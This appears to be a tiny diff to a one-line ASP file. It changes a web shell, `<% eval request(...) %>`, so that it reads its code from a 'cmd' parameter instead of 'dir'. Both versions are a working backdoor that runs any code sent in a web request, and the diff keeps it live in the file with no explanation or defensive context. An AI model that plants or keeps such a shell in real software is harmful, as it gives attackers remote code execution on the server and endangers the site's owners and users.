@@ -1,1 +1,1 @@
-<% eval request("dir") %>
+<% eval request("cmd") %>
